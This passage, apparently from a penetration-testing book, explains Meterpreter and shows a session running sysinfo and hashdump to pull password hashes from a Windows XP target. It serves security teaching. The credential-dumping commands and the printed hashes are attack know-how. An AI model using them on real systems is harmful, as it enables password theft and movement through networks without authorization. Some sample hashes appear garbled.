This gives us the ability to interact with the remote system using Meterpreter, which is an operating system agnostic shell language. It has a number of commands that can be run against the target system regardless of what operating system the target system has. Meterpreter translates the commands passed to it into ones that are specific to the underlying operating system. This can include listing files, changing directories, uploading files, and gathering system information like passwords.

# # Gathering Passwords

Once you have an exploited system, you will want to start gathering information on it. One type of information is the passwords on the system. There are a couple of ways to gather these passwords. In the preceding code listing, we got a Meterpreter shell on a target system. Not all exploits in Metasploit can yield a Meterpreter shell, but if we can get one, we have a powerful ally in gathering information and performing post-exploitation work. Using Meterpreter, we can gather information about the system so we know what we’re getting for password data. The command sysinfo will tell us the system name as well as the operating system. This tells us we’re going to be looking at LAN Manager hashes when we grab the passwords. We can do that using the hashdump command, which you can see in the following listing.

# ## Obtaining passwords with Meterpreter

```
Computer : WUBBLE-C765F2
OS : Windows XP (Build 2600, Service Pack 2).
Architecture : x86
System Language : en_US
Domain : WORKGROUP
Logged On Users : 2
Meterpreter : x86/windows
meterpreter > hashdump
Administrator:500:ed174b86559f980793e287acb8bfb6a6:5f7277b8636525ad2d2d551867124dbd:::
ASPNET:1003:5b8cce8d8be0de65545ae4da158944afa0:227510be54d4e5285f3537a22e855dfc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:78e6e0596b41f8006c381f86e9eefac3:ef49e487f735954db1536660525657047d:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:2e54affffleaab6b62fc0649b715104187:::
```

The hashdump provides the username, the user identifier, and the hash value of the password. We’ll need that when it comes to cracking the password. These credentials will be helpful as we continue moving through the network. The credentials may be useful for additional vulnerabilities, or at least with different testing programs and Metasploit modules.